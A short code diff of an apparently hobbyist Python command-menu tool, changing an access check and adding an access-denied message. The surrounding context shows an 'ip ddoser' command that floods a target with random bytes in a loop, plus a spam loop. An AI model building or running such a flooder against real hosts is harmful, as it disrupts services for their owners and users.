@@ -244,7 +244,7 @@ if loop == "no" or loop == "n":
     while True:
         print(spamming_profile)
   if command == "ip ddoser" or command == "ddos":
-    if access_status == "yes":
+    if access_status == "granted":
      print("activating the ip ddoser...")
      time.sleep(3)
      print("procceded.")
@@ -257,7 +257,7 @@ if loop == "no" or loop == "n":
       profile.send(random._urandom(10)*1000)
       print(f"send: {i}", end='\r')  
     else:
-     None
+      print("you cannot use this command with that standard access.")
   if command == "pc process" or command == "process" or command == "proc":
     import wmi
     f = wmi.WMI()
